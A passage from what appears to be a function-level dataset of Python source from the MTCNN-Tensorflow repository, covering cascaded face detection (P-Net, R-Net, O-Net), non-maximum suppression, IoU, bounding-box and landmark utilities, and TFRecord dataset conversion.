    edy[tmp_index] = tmph[tmp_index] + h - 2 - ey[tmp_index]
    ey[tmp_index] = h - 1
    tmp_index = np.where(x < 0)
    dx[tmp_index] = 0 - x[tmp_index]
    x[tmp_index] = 0
    tmp_index = np.where(y < 0)
    dy[tmp_index] = 0 - y[tmp_index]
    y[tmp_index] = 0
    return_list = [dy, edy, dx, edx, y, ey, x, ex, tmpw, tmph]
    return_list = [item.astype(np.int32) for item in return_list]
    return return_list"
AITTSMD/MTCNN-Tensorflow,detect_pnet,"def detect_pnet(self, im):
    """"""Get face candidates through pnet

        Parameters:
        ----------
        im: numpy array
            input image array

        Returns:
        -------
        boxes: numpy array
            detected boxes before calibration
        boxes_c: numpy array
            boxes after calibration
        """"""
    (h, w, c) = im.shape
    net_size = 12
    current_scale = float(net_size) / self.min_face_size
    im_resized = self.processed_image(im, current_scale)
    (current_height, current_width, _) = im_resized.shape
    all_boxes = list()
    while min(current_height, current_width) > net_size:
        (cls_cls_map, reg) = self.pnet_detector.predict(im_resized)
        boxes = self.generate_bbox(cls_cls_map[:, :, 1], reg, current_scale, self.thresh[0])
        current_scale *= self.scale_factor
        im_resized = self.processed_image(im, current_scale)
        (current_height, current_width, _) = im_resized.shape
        if boxes.size == 0:
            continue
        keep = py_nms(boxes[:, :5], 0.5, 'Union')
        boxes = boxes[keep]
        all_boxes.append(boxes)
    if len(all_boxes) == 0:
        return (None, None, None)
    all_boxes = np.vstack(all_boxes)
    keep = py_nms(all_boxes[:, 0:5], 0.7, 'Union')
    all_boxes = all_boxes[keep]
    boxes = all_boxes[:, :5]
    bbw = all_boxes[:, 2] - all_boxes[:, 0] + 1
    bbh = all_boxes[:, 3] - all_boxes[:, 1] + 1
    boxes_c = np.vstack([all_boxes[:, 0] + all_boxes[:, 5] * bbw, all_boxes[:, 1] + all_boxes[:, 6] * bbh, all_boxes[:, 2] + all_boxes[:, 7] * bbw, all_boxes[:, 3] + all_boxes[:, 8] * bbh, all_boxes[:, 4]])
    boxes_c = boxes_c.T
    return (boxes, boxes_c, None)"
AITTSMD/MTCNN-Tensorflow,detect_rnet,"def detect_rnet(self, im, dets):
    """"""Get face candidates using rnet

        Parameters:
        ----------
        im: numpy array
            input image array
        dets: numpy array
            detection results of pnet

        Returns:
        -------
        boxes: numpy array
            detected boxes before calibration
        boxes_c: numpy array
            boxes after calibration
        """"""
    (h, w, c) = im.shape
    dets = self.convert_to_square(dets)
    dets[:, 0:4] = np.round(dets[:, 0:4])
    [dy, edy, dx, edx, y, ey, x, ex, tmpw, tmph] = self.pad(dets, w, h)
    num_boxes = dets.shape[0]
    cropped_ims = np.zeros((num_boxes, 24, 24, 3), dtype=np.float32)
    for i in range(num_boxes):
        tmp = np.zeros((tmph[i], tmpw[i], 3), dtype=np.uint8)
        tmp[dy[i]:edy[i] + 1, dx[i]:edx[i] + 1, :] = im[y[i]:ey[i] + 1, x[i]:ex[i] + 1, :]
        cropped_ims[i, :, :, :] = (cv2.resize(tmp, (24, 24)) - 127.5) / 128
    (cls_scores, reg, _) = self.rnet_detector.predict(cropped_ims)
    cls_scores = cls_scores[:, 1]
    keep_inds = np.where(cls_scores > self.thresh[1])[0]
    if len(keep_inds) > 0:
        boxes = dets[keep_inds]
        boxes[:, 4] = cls_scores[keep_inds]
        reg = reg[keep_inds]
    else:
        return (None, None, None)
    keep = py_nms(boxes, 0.6)
    boxes = boxes[keep]
    boxes_c = self.calibrate_box(boxes, reg[keep])
    return (boxes, boxes_c, None)"
AITTSMD/MTCNN-Tensorflow,detect_onet,"def detect_onet(self, im, dets):
    """"""Get face candidates using onet

        Parameters:
        ----------
        im: numpy array
            input image array
        dets: numpy array
            detection results of rnet

        Returns:
        -------
        boxes: numpy array
            detected boxes before calibration
        boxes_c: numpy array
            boxes after calibration
        """"""
    (h, w, c) = im.shape
    dets = self.convert_to_square(dets)
    dets[:, 0:4] = np.round(dets[:, 0:4])
    [dy, edy, dx, edx, y, ey, x, ex, tmpw, tmph] = self.pad(dets, w, h)
    num_boxes = dets.shape[0]
    cropped_ims = np.zeros((num_boxes, 48, 48, 3), dtype=np.float32)
    for i in range(num_boxes):
        tmp = np.zeros((tmph[i], tmpw[i], 3), dtype=np.uint8)
        tmp[dy[i]:edy[i] + 1, dx[i]:edx[i] + 1, :] = im[y[i]:ey[i] + 1, x[i]:ex[i] + 1, :]
        cropped_ims[i, :, :, :] = (cv2.resize(tmp, (48, 48)) - 127.5) / 128
    (cls_scores, reg, landmark) = self.onet_detector.predict(cropped_ims)
    cls_scores = cls_scores[:, 1]
    keep_inds = np.where(cls_scores > self.thresh[2])[0]
    if len(keep_inds) > 0:
        boxes = dets[keep_inds]
        boxes[:, 4] = cls_scores[keep_inds]
        reg = reg[keep_inds]
        landmark = landmark[keep_inds]
    else:
        return (None, None, None)
    w = boxes[:, 2] - boxes[:, 0] + 1
    h = boxes[:, 3] - boxes[:, 1] + 1
    landmark[:, 0::2] = (np.tile(w, (5, 1)) * landmark[:, 0::2].T + np.tile(boxes[:, 0], (5, 1)) - 1).T
    landmark[:, 1::2] = (np.tile(h, (5, 1)) * landmark[:, 1::2].T + np.tile(boxes[:, 1], (5, 1)) - 1).T
    boxes_c = self.calibrate_box(boxes, reg)
    boxes = boxes[py_nms(boxes, 0.6, 'Minimum')]
    keep = py_nms(boxes_c, 0.6, 'Minimum')
    boxes_c = boxes_c[keep]
    landmark = landmark[keep]
    return (boxes, boxes_c, landmark)"
AITTSMD/MTCNN-Tensorflow,detect,"def detect(self, img):
    """"""Detect face over image
        """"""
    boxes = None
    t = time.time()
    t1 = 0
    if self.pnet_detector:
        (boxes, boxes_c, _) = self.detect_pnet(img)
        if boxes_c is None:
            return (np.array([]), np.array([]))
        t1 = time.time() - t
        t = time.time()
    t2 = 0
    if self.rnet_detector:
        (boxes, boxes_c, _) = self.detect_rnet(img, boxes_c)
        if boxes_c is None:
            return (np.array([]), np.array([]))
        t2 = time.time() - t
        t = time.time()
    t3 = 0
    if self.onet_detector:
        (boxes, boxes_c, landmark) = self.detect_onet(img, boxes_c)
        if boxes_c is None:
            return (np.array([]), np.array([]))
        t3 = time.time() - t
        t = time.time()
    return (boxes_c, landmark)"
AITTSMD/MTCNN-Tensorflow,detect_face,"def detect_face(self, test_data):
    all_boxes = []
    landmarks = []
    batch_idx = 0
    sum_time = 0
    t1_sum = 0
    t2_sum = 0
    t3_sum = 0
    num_of_img = test_data.size
    empty_array = np.array([])
    s_time = time.time()
    for databatch in test_data:
        batch_idx += 1
        if batch_idx % 100 == 0:
            c_time = (time.time() - s_time) / 100
            print('%d out of %d images done' % (batch_idx, test_data.size))
            print('%f seconds for each image' % c_time)
            s_time = time.time()
        im = databatch
        if self.pnet_detector:
            st = time.time()
            (boxes, boxes_c, landmark) = self.detect_pnet(im)
            t1 = time.time() - st
            sum_time += t1
            t1_sum += t1
            if boxes_c is None:
                print('boxes_c is None...')
                all_boxes.append(empty_array)
                landmarks.append(empty_array)
                continue
        if self.rnet_detector:
            t = time.time()
            (boxes, boxes_c, landmark) = self.detect_rnet(im, boxes_c)
            t2 = time.time() - t
            sum_time += t2
            t2_sum += t2
            if boxes_c is None:
                all_boxes.append(empty_array)
                landmarks.append(empty_array)
                continue
        if self.onet_detector:
            t = time.time()
            (boxes, boxes_c, landmark) = self.detect_onet(im, boxes_c)
            t3 = time.time() - t
            sum_time += t3
            t3_sum += t3
            if boxes_c is None:
                all_boxes.append(empty_array)
                landmarks.append(empty_array)
                continue
        all_boxes.append(boxes_c)
        landmark = [1]
        landmarks.append(landmark)
    print('num of images', num_of_img)
    print('time cost in average' + '{:.3f}'.format(sum_time / num_of_img) + '  pnet {:.3f}  rnet {:.3f}  onet {:.3f}'.format(t1_sum / num_of_img, t2_sum / num_of_img, t3_sum / num_of_img))
    print('boxes length:', len(all_boxes))
    return (all_boxes, landmarks)"
AITTSMD/MTCNN-Tensorflow,detect_single_image,"def detect_single_image(self, im):
    all_boxes = []
    landmarks = []
    t1 = 0
    if self.pnet_detector:
        (boxes, boxes_c, landmark) = self.detect_pnet(im)
        if boxes_c is None:
            print('boxes_c is None...')
            all_boxes.append(np.array([]))
            landmarks.append(np.array([]))
    if boxes_c is None:
        print('boxes_c is None after Pnet')
    t2 = 0
    if self.rnet_detector and (not boxes_c is None):
        (boxes, boxes_c, landmark) = self.detect_rnet(im, boxes_c)
        if boxes_c is None:
            all_boxes.append(np.array([]))
            landmarks.append(np.array([]))
    t3 = 0
    if boxes_c is None:
        print('boxes_c is None after Rnet')
    if self.onet_detector and (not boxes_c is None):
        (boxes, boxes_c, landmark) = self.detect_onet(im, boxes_c)
        if boxes_c is None:
            all_boxes.append(np.array([]))
            landmarks.append(np.array([]))
    all_boxes.append(boxes_c)
    landmarks.append(landmark)
    return (all_boxes, landmarks)"
AITTSMD/MTCNN-Tensorflow,__init__,"def __init__(self, net_factory, data_size, batch_size, model_path):
    graph = tf.Graph()
    with graph.as_default():
        self.image_op = tf.placeholder(tf.float32, shape=[batch_size, data_size, data_size, 3], name='input_image')
        (self.cls_prob, self.bbox_pred, self.landmark_pred) = net_factory(self.image_op, training=False)
        self.sess = tf.Session(config=tf.ConfigProto(allow_soft_placement=True, gpu_options=tf.GPUOptions(allow_growth=True)))
        saver = tf.train.Saver()
        model_dict = '/'.join(model_path.split('/')[:-1])
        ckpt = tf.train.get_checkpoint_state(model_dict)
        print(model_path)
        readstate = ckpt and ckpt.model_checkpoint_path
        assert readstate, 'the params dictionary is not valid'
        print(""restore models' param"")
        saver.restore(self.sess, model_path)
    self.data_size = data_size
    self.batch_size = batch_size"
AITTSMD/MTCNN-Tensorflow,predict,"def predict(self, databatch):
    scores = []
    batch_size = self.batch_size
    minibatch = []
    cur = 0
    n = databatch.shape[0]
    while cur < n:
        minibatch.append(databatch[cur:min(cur + batch_size, n), :, :, :])
        cur += batch_size
    cls_prob_list = []
    bbox_pred_list = []
    landmark_pred_list = []
    for (idx, data) in enumerate(minibatch):
        m = data.shape[0]
        real_size = self.batch_size
        if m < batch_size:
            keep_inds = np.arange(m)
            gap = self.batch_size - m
            while gap >= len(keep_inds):
                gap -= len(keep_inds)
                keep_inds = np.concatenate((keep_inds, keep_inds))
            if gap != 0:
                keep_inds = np.concatenate((keep_inds, keep_inds[:gap]))
            data = data[keep_inds]
            real_size = m
        (cls_prob, bbox_pred, landmark_pred) = self.sess.run([self.cls_prob, self.bbox_pred, self.landmark_pred], feed_dict={self.image_op: data})
        cls_prob_list.append(cls_prob[:real_size])
        bbox_pred_list.append(bbox_pred[:real_size])
        landmark_pred_list.append(landmark_pred[:real_size])
    return (np.concatenate(cls_prob_list, axis=0), np.concatenate(bbox_pred_list, axis=0), np.concatenate(landmark_pred_list, axis=0))"
AITTSMD/MTCNN-Tensorflow,__init__,"def __init__(self, net_factory, model_path):
    graph = tf.Graph()
    with graph.as_default():
        self.image_op = tf.placeholder(tf.float32, name='input_image')
        self.width_op = tf.placeholder(tf.int32, name='image_width')
        self.height_op = tf.placeholder(tf.int32, name='image_height')
        image_reshape = tf.reshape(self.image_op, [1, self.height_op, self.width_op, 3])
        (self.cls_prob, self.bbox_pred, _) = net_factory(image_reshape, training=False)
        self.sess = tf.Session(config=tf.ConfigProto(allow_soft_placement=True, gpu_options=tf.GPUOptions(allow_growth=True)))
        saver = tf.train.Saver()
        model_dict = '/'.join(model_path.split('/')[:-1])
        ckpt = tf.train.get_checkpoint_state(model_dict)
        print(model_path)
        readstate = ckpt and ckpt.model_checkpoint_path
        assert readstate, 'the params dictionary is not valid'
        print(""restore models' param"")
        saver.restore(self.sess, model_path)"
AITTSMD/MTCNN-Tensorflow,predict,"def predict(self, databatch):
    (height, width, _) = databatch.shape
    (cls_prob, bbox_pred) = self.sess.run([self.cls_prob, self.bbox_pred], feed_dict={self.image_op: databatch, self.width_op: width, self.height_op: height})
    return (cls_prob, bbox_pred)"
AITTSMD/MTCNN-Tensorflow,py_nms,"def py_nms(dets, thresh, mode='Union'):
    """"""
    greedily select boxes with high confidence
    keep boxes overlap <= thresh
    rule out overlap > thresh
    :param dets: [[x1, y1, x2, y2 score]]
    :param thresh: retain overlap <= thresh
    :return: indexes to keep
    """"""
    x1 = dets[:, 0]
    y1 = dets[:, 1]
    x2 = dets[:, 2]
    y2 = dets[:, 3]
    scores = dets[:, 4]
    areas = (x2 - x1 + 1) * (y2 - y1 + 1)
    order = scores.argsort()[::-1]
    keep = []
    while order.size > 0:
        i = order[0]
        keep.append(i)
        xx1 = np.maximum(x1[i], x1[order[1:]])
        yy1 = np.maximum(y1[i], y1[order[1:]])
        xx2 = np.minimum(x2[i], x2[order[1:]])
        yy2 = np.minimum(y2[i], y2[order[1:]])
        w = np.maximum(0.0, xx2 - xx1 + 1)
        h = np.maximum(0.0, yy2 - yy1 + 1)
        inter = w * h
        if mode == 'Union':
            ovr = inter / (areas[i] + areas[order[1:]] - inter)
        elif mode == 'Minimum':
            ovr = inter / np.minimum(areas[i], areas[order[1:]])
        inds = np.where(ovr <= thresh)[0]
        order = order[inds + 1]
    return keep"
AITTSMD/MTCNN-Tensorflow,logger,"def logger(msg):
    """"""
        log message
    """"""
    now = time.ctime()
    print('[%s] %s' % (now, msg))"
AITTSMD/MTCNN-Tensorflow,createDir,"def createDir(p):
    if not os.path.exists(p):
        os.mkdir(p)"
AITTSMD/MTCNN-Tensorflow,shuffle_in_unison_scary,"def shuffle_in_unison_scary(a, b):
    rng_state = np.random.get_state()
    np.random.shuffle(a)
    np.random.set_state(rng_state)
    np.random.shuffle(b)"
AITTSMD/MTCNN-Tensorflow,drawLandmark,"def drawLandmark(img, bbox, landmark):
    cv2.rectangle(img, (bbox.left, bbox.top), (bbox.right, bbox.bottom), (0, 0, 255), 2)
    for (x, y) in landmark:
        cv2.circle(img, (int(x), int(y)), 2, (0, 255, 0), -1)
    return img"
AITTSMD/MTCNN-Tensorflow,getDataFromTxt,"def getDataFromTxt(txt, data_path, with_landmark=True):
    """"""
        Generate data from txt file
        return [(img_path, bbox, landmark)]
            bbox: [left, right, top, bottom]
            landmark: [(x1, y1), (x2, y2), ...]
    """"""
    with open(txt, 'r') as fd:
        lines = fd.readlines()
    result = []
    for line in lines:
        line = line.strip()
        components = line.split(' ')
        img_path = os.path.join(data_path, components[0]).replace('\\', '/')
        bbox = (components[1], components[3], components[2], components[4])
        bbox = [float(_) for _ in bbox]
        bbox = list(map(int, bbox))
        if not with_landmark:
            result.append((img_path, BBox(bbox)))
            continue
        landmark = np.zeros((5, 2))
        for index in range(0, 5):
            rv = (float(components[5 + 2 * index]), float(components[5 + 2 * index + 1]))
            landmark[index] = rv
        '\n        for index, one in enumerate(landmark):\n            rv = ((one[0]-bbox[0])/(bbox[2]-bbox[0]), (one[1]-bbox[1])/(bbox[3]-bbox[1]))\n            landmark[index] = rv\n        '
        result.append((img_path, BBox(bbox), landmark))
    return result"
AITTSMD/MTCNN-Tensorflow,getPatch,"def getPatch(img, bbox, point, padding):
    """"""
        Get a patch iamge around the given point in bbox with padding
        point: relative_point in [0, 1] in bbox
    """"""
    point_x = bbox.x + point[0] * bbox.w
    point_y = bbox.y + point[1] * bbox.h
    patch_left = point_x - bbox.w * padding
    patch_right = point_x + bbox.w * padding
    patch_top = point_y - bbox.h * padding
    patch_bottom = point_y + bbox.h * padding
    patch = img[patch_top:patch_bottom + 1, patch_left:patch_right + 1]
    patch_bbox = BBox([patch_left, patch_right, patch_top, patch_bottom])
    return (patch, patch_bbox)"
AITTSMD/MTCNN-Tensorflow,processImage,"def processImage(imgs):
    """"""
        process images before feeding to CNNs
        imgs: N x 1 x W x H
    """"""
    imgs = imgs.astype(np.float32)
    for (i, img) in enumerate(imgs):
        imgs[i] = (img - 127.5) / 128
    return imgs"
AITTSMD/MTCNN-Tensorflow,dataArgument,"def dataArgument(data):
    """"""
        dataArguments
        data:
            imgs: N x 1 x W x H
            bbox: N x BBox
            landmarks: N x 10
    """"""
    pass"
AITTSMD/MTCNN-Tensorflow,__init__,"def __init__(self, bbox):
    self.left = bbox[0]
    self.top = bbox[1]
    self.right = bbox[2]
    self.bottom = bbox[3]
    self.x = bbox[0]
    self.y = bbox[1]
    self.w = bbox[2] - bbox[0]
    self.h = bbox[3] - bbox[1]"
AITTSMD/MTCNN-Tensorflow,expand,"def expand(self, scale=0.05):
    bbox = [self.left, self.right, self.top, self.bottom]
    bbox[0] -= int(self.w * scale)
    bbox[1] += int(self.w * scale)
    bbox[2] -= int(self.h * scale)
    bbox[3] += int(self.h * scale)
    return BBox(bbox)"
AITTSMD/MTCNN-Tensorflow,project,"def project(self, point):
    x = (point[0] - self.x) / self.w
    y = (point[1] - self.y) / self.h
    return np.asarray([x, y])"
AITTSMD/MTCNN-Tensorflow,reproject,"def reproject(self, point):
    x = self.x + self.w * point[0]
    y = self.y + self.h * point[1]
    return np.asarray([x, y])"
AITTSMD/MTCNN-Tensorflow,reprojectLandmark,"def reprojectLandmark(self, landmark):
    p = np.zeros((len(landmark), 2))
    for i in range(len(landmark)):
        p[i] = self.reproject(landmark[i])
    return p"
AITTSMD/MTCNN-Tensorflow,projectLandmark,"def projectLandmark(self, landmark):
    p = np.zeros((len(landmark), 2))
    for i in range(len(landmark)):
        p[i] = self.project(landmark[i])
    return p"
AITTSMD/MTCNN-Tensorflow,subBBox,"def subBBox(self, leftR, rightR, topR, bottomR):
    leftDelta = self.w * leftR
    rightDelta = self.w * rightR
    topDelta = self.h * topR
    bottomDelta = self.h * bottomR
    left = self.left + leftDelta
    right = self.left + rightDelta
    top = self.top + topDelta
    bottom = self.top + bottomDelta
    return BBox([left, right, top, bottom])"
AITTSMD/MTCNN-Tensorflow,show_landmark,"def show_landmark(face, landmark):
    """"""
        view face with landmark for visualization
    """"""
    face_copied = face.copy().astype(np.uint8)
    for (x, y) in landmark:
        xx = int(face.shape[0] * x)
        yy = int(face.shape[1] * y)
        cv2.circle(face_copied, (xx, yy), 2, (0, 0, 0), -1)
    cv2.imshow('face_rot', face_copied)
    cv2.waitKey(0)"
AITTSMD/MTCNN-Tensorflow,rotate,"def rotate(img, bbox, landmark, alpha):
    """"""
        given a face with bbox and landmark, rotate with alpha
        and return rotated face with bbox, landmark (absolute position)
    """"""
    center = ((bbox.left + bbox.right) / 2, (bbox.top + bbox.bottom) / 2)
    rot_mat = cv2.getRotationMatrix2D(center, alpha, 1)
    img_rotated_by_alpha = cv2.warpAffine(img, rot_mat, (img.shape[1], img.shape[0]))
    landmark_ = np.asarray([(rot_mat[0][0] * x + rot_mat[0][1] * y + rot_mat[0][2], rot_mat[1][0] * x + rot_mat[1][1] * y + rot_mat[1][2]) for (x, y) in landmark])
    face = img_rotated_by_alpha[bbox.top:bbox.bottom + 1, bbox.left:bbox.right + 1]
    return (face, landmark_)"
AITTSMD/MTCNN-Tensorflow,flip,"def flip(face, landmark):
    """"""
        flip face
    """"""
    face_flipped_by_x = cv2.flip(face, 1)
    landmark_ = np.asarray([(1 - x, y) for (x, y) in landmark])
    landmark_[[0, 1]] = landmark_[[1, 0]]
    landmark_[[3, 4]] = landmark_[[4, 3]]
    return (face_flipped_by_x, landmark_)"
AITTSMD/MTCNN-Tensorflow,randomShift,"def randomShift(landmarkGt, shift):
    """"""
        Random Shift one time
    """"""
    diff = np.random.rand(5, 2)
    diff = (2 * diff - 1) * shift
    landmarkP = landmarkGt + diff
    return landmarkP"
AITTSMD/MTCNN-Tensorflow,randomShiftWithArgument,"def randomShiftWithArgument(landmarkGt, shift):
    """"""
        Random Shift more
    """"""
    N = 2
    landmarkPs = np.zeros((N, 5, 2))
    for i in range(N):
        landmarkPs[i] = randomShift(landmarkGt, shift)
    return landmarkPs"
AITTSMD/MTCNN-Tensorflow,read_annotation,"def read_annotation(base_dir, label_path):
    """"""
    read label file
    :param dir: path
    :return:
    """"""
    data = dict()
    images = []
    bboxes = []
    labelfile = open(label_path, 'r')
    while True:
        imagepath = labelfile.readline().strip('\n')
        if not imagepath:
            break
        imagepath = base_dir + '/WIDER_train/images/' + imagepath
        images.append(imagepath)
        nums = labelfile.readline().strip('\n')
        one_image_bboxes = []
        for i in range(int(nums)):
            bb_info = labelfile.readline().strip('\n').split(' ')
            face_box = [float(bb_info[i]) for i in range(4)]
            xmin = face_box[0]
            ymin = face_box[1]
            xmax = xmin + face_box[2]
            ymax = ymin + face_box[3]
            one_image_bboxes.append([xmin, ymin, xmax, ymax])
        bboxes.append(one_image_bboxes)
    data['images'] = images
    data['bboxes'] = bboxes
    return data"
AITTSMD/MTCNN-Tensorflow,read_and_write_annotation,"def read_and_write_annotation(base_dir, dir):
    """"""
    read label file
    :param dir: path
    :return:
    """"""
    data = dict()
    images = []
    bboxes = []
    labelfile = open(dir, 'r')
    f = open('/home/thinkjoy/data/mtcnn_data/imagelists/train.txt', 'w')
    while True:
        imagepath = labelfile.readline().strip('\n')
        if not imagepath:
            break
        imagepath = base_dir + '/WIDER_train/images/' + imagepath
        images.append(imagepath)
        nums = labelfile.readline().strip('\n')
        im = cv2.imread(imagepath)
        (h, w, c) = im.shape
        one_image_bboxes = []
        for i in range(int(nums)):
            text = ''
            text = text + imagepath
            bb_info = labelfile.readline().strip('\n').split(' ')
            face_box = [float(bb_info[i]) for i in range(4)]
            text = text + ' ' + str(face_box[0] / w) + ' ' + str(face_box[1] / h)
            xmin = face_box[0]
            ymin = face_box[1]
            xmax = xmin + face_box[2] - 1
            ymax = ymin + face_box[3] - 1
            text = text + ' ' + str(xmax / w) + ' ' + str(ymax / h)
            one_image_bboxes.append([xmin, ymin, xmax, ymax])
            f.write(text + '\n')
        bboxes.append(one_image_bboxes)
    data['images'] = images
    data['bboxes'] = bboxes
    f.close()
    return data"
AITTSMD/MTCNN-Tensorflow,get_path,"def get_path(base_dir, filename):
    return os.path.join(base_dir, filename)"
AITTSMD/MTCNN-Tensorflow,IoU,"def IoU(box, bboxes):
    """"""
    Caculate IoU between detect and ground truth boxes
    :param crop_box:numpy array (4, )
    :param bboxes:numpy array (n, 4):x1, y1, x2, y2
    :return:
    numpy array, shape (n, ) Iou
    """"""
    box_area = (box[2] - box[0] + 1) * (box[3] - box[1] + 1)
    areas = (bboxes[:, 2] - bboxes[:, 0] + 1) * (bboxes[:, 3] - bboxes[:, 1] + 1)
    xx1 = np.maximum(box[0], bboxes[:, 0])
    yy1 = np.maximum(box[1], bboxes[:, 1])
    xx2 = np.minimum(box[2], bboxes[:, 2])
    yy2 = np.minimum(box[3], bboxes[:, 3])
    w = np.maximum(0, xx2 - xx1 + 1)
    h = np.maximum(0, yy2 - yy1 + 1)
    inter = w * h
    over = inter / (box_area + areas - inter)
    return over"
AITTSMD/MTCNN-Tensorflow,_add_to_tfrecord,"def _add_to_tfrecord(filename, image_example, tfrecord_writer):
    """"""Loads data from image and annotations files and add them to a TFRecord.

    Args:
      dataset_dir: Dataset directory;
      name: Image name to add to the TFRecord;
      tfrecord_writer: The TFRecord writer to use for writing.
    """"""
    (image_data, height, width) = _process_image_withoutcoder(filename)
    example = _convert_to_example_simple(image_example, image_data)
    tfrecord_writer.write(example.SerializeToString())"
AITTSMD/MTCNN-Tensorflow,_get_output_filename,"def _get_output_filename(output_dir, name, net):
    return '%s/neg_landmark.tfrecord' % output_dir"
AITTSMD/MTCNN-Tensorflow,run,"def run(dataset_dir, net, output_dir, name='MTCNN', shuffling=False):
    """"""Runs the conversion operation.

    Args:
      dataset_dir: The dataset directory where the dataset is stored.
      output_dir: Output directory.
    """"""
    tf_filename = _get_output_filename(output_dir, name, net)
    if tf.gfile.Exists(tf_filename):
        print('Dataset files already exist. Exiting without re-creating them.')
        return
    dataset = get_dataset(dataset_dir, net=net)
    if shuffling:
        tf_filename = tf_filename + '_shuffle'
        random.shuffle(dataset)
    print('lala')
    with tf.python_io.TFRecordWriter(tf_filename) as tfrecord_writer:
        for (i, image_example) in enumerate(dataset):
            if i % 100 == 0:
                sys.stdout.write('\r>> Converting image %d/%d' % (i + 1, len(dataset)))
                sys.stdout.flush()
            filename = image_example['filename']
            _add_to_tfrecord(filename, image_example, tfrecord_writer)
    print('\nFinished converting the MTCNN dataset!')"
AITTSMD/MTCNN-Tensorflow,get_dataset,"def get_dataset(dir, net='PNet'):
    item = '%s/neg_%s.txt' % (net, net)
    dataset_dir = os.path.join(dir, item)
    imagelist = open(dataset_dir, 'r')
    dataset = []
    for line in imagelist.readlines():
        info = line.strip().split(' ')
        data_example = dict()
        bbox = dict()
        data_example['filename'] = info[0]
        data_example['label'] = int(info[1])
        bbox['xmin'] = 0
        bbox['ymin'] = 0
        bbox['xmax'] = 0
        bbox['ymax'] = 0
        bbox['xlefteye'] = 0
        bbox['ylefteye'] = 0
        bbox['xrighteye'] = 0
        bbox['yrighteye'] = 0
        bbox['xnose'] = 0
        bbox['ynose'] = 0
        bbox['xleftmouth'] = 0
        bbox['yleftmouth'] = 0
        bbox['xrightmouth'] = 0
        bbox['yrightmouth'] = 0
        if len(info) == 6:
            bbox['xmin'] = float(info[2])
            bbox['ymin'] = float(info[3])
            bbox['xmax'] = float(info[4])
            bbox['ymax'] = float(info[5])
        if len(info) == 12:
            bbox['xlefteye'] = float(info[2])
            bbox['ylefteye'] = float(info[3])
            bbox['xrighteye'] = float(info[4])
            bbox['yrighteye'] = float(info[5])
            bbox['xnose'] = float(info[6])
            bbox['ynose'] = float(info[7])
            bbox['xleftmouth'] = float(info[8])
            bbox['yleftmouth'] = float(info[9])
            bbox['xrightmouth'] = float(info[10])
            bbox['yrightmouth'] = float(info[11])
        data_example['bbox'] = bbox
        dataset.append(data_example)
    return dataset"
AITTSMD/MTCNN-Tensorflow,_add_to_tfrecord,"def _add_to_tfrecord(filename, image_example, tfrecord_writer):
    """"""Loads data from image and annotations files and add them to a TFRecord.

    Args:
      filename: Dataset directory;
      name: Image name to add to the TFRecord;
      tfrecord_writer: The TFRecord writer to use for writing.
    """"""
    (image_data, height, width) = _process_image_withoutcoder(filename)
    example = _convert_to_example_simple(image_example, image_data)
    tfrecord_writer.write(example.SerializeToString())"
AITTSMD/MTCNN-Tensorflow,_get_output_filename,"def _get_output_filename(output_dir, name, net):
    return '%s/train_PNet_landmark.tfrecord' % output_dir"
AITTSMD/MTCNN-Tensorflow,run,"def run(dataset_dir, net, output_dir, name='MTCNN', shuffling=False):
    """"""Runs the conversion operation.

    Args:
      dataset_dir: The dataset directory where the dataset is stored.
      output_dir: Output directory.
    """"""
    tf_filename = _get_output_filename(output_dir, name, net)
    if tf.gfile.Exists(tf_filename):
        print('Dataset files already exist. Exiting without re-creating them.')
        return
    dataset = get_dataset(dataset_dir, net=net)
    if shuffling:
        tf_filename = tf_filename + '_shuffle'
        random.shuffle(dataset)
    print('lala')
    with tf.python_io.TFRecordWriter(tf_filename) as tfrecord_writer:
        for (i, image_example) in enumerate(dataset):
            if (i + 1) % 100 == 0:
                sys.stdout.write('\r>> %d/%d images has been converted' % (i + 1, len(dataset)))
            sys.stdout.flush()
            filename = image_example['filename']
            _add_to_tfrecord(filename, image_example, tfrecord_writer)
    print('\nFinished converting the MTCNN dataset!')"
AITTSMD/MTCNN-Tensorflow,get_dataset,"def get_dataset(dir, net='PNet'):
    item = 'imglists/PNet/train_%s_landmark.txt' % net
    dataset_dir = os.path.join(dir, item)
    imagelist = open(dataset_dir, 'r')
    dataset = []
    for line in imagelist.readlines():
        info = line.strip().split(' ')
        data_example = dict()
        bbox = dict()
        data_example['filename'] = info[0]
        data_example['label'] = int(info[1])
        bbox['xmin'] = 0
        bbox['ymin'] = 0
        bbox['xmax'] = 0
        bbox['ymax'] = 0
        bbox['xlefteye'] = 0
        bbox['ylefteye'] = 0
        bbox['xrighteye'] = 0
        bbox['yrighteye'] = 0
        bbox['xnose'] = 0
        bbox['ynose'] = 0
        bbox['xleftmouth'] = 0
        bbox['yleftmouth'] = 0
        bbox['xrightmouth'] = 0
        bbox['yrightmouth'] = 0
        if len(info) == 6:
            bbox['xmin'] = float(info[2])
            bbox['ymin'] = float(info[3])
            bbox['xmax'] = float(info[4])
            bbox['ymax'] = float(info[5])
        if len(info) == 12:
            bbox['xlefteye'] = float(info[2])
            bbox['ylefteye'] = float(info[3])
            bbox['xrighteye'] = float(info[4])
            bbox['yrighteye'] = float(info[5])
            bbox['xnose'] = float(info[6])
            bbox['ynose'] = float(info[7])
            bbox['xleftmouth'] = float(info[8])
            bbox['yleftmouth'] = float(info[9])
            bbox['xrightmouth'] = float(info[10])
            bbox['yrightmouth'] = float(info[11])
        data_example['bbox'] = bbox
        dataset.append(data_example)
    return dataset"
AITTSMD/MTCNN-Tensorflow,_add_to_tfrecord,"def _add_to_tfrecord(filename, image_example, tfrecord_writer):
    """"""Loads data from image and annotations files and add them to a TFRecord.

    Args:
      dataset_dir: Dataset directory;
      name: Image name to add to the TFRecord;
      tfrecord_writer: The TFRecord writer to use for writing.
    """"""
    (image_data, height, width) = _process_image_withoutcoder(filename)
    example = _convert_to_example_simple(image_example, image_data)
    tfrecord_writer.write(example.SerializeToString())"
AITTSMD/MTCNN-Tensorflow,_get_output_filename,"def _get_output_filename(output_dir, name, net):
    return '%s/%s_landmark.tfrecord' % (output_dir, name)"
AITTSMD/MTCNN-Tensorflow,run,"def run(dataset_dir, net, output_dir, name='MTCNN', shuffling=False):
    """"""Runs the conversion operation.

    Args:
      dataset_dir: The dataset directory where the dataset is stored.
      output_dir: Output directory.
    """"""
    tf_filename = _get_output_filename(output_dir, name, net)
    if tf.gfile.Exists(tf_filename):
        print('Dataset files already exist. Exiting without re-creating them.')
        return
    dataset = get_dataset(dataset_dir, name, net=net)
    if shuffling:
        tf_filename = tf_filename + '_shuffle'
        random.shuffle(dataset)
    print('lala')
    with tf.python_io.TFRecordWriter(tf_filename) as tfrecord_writer:
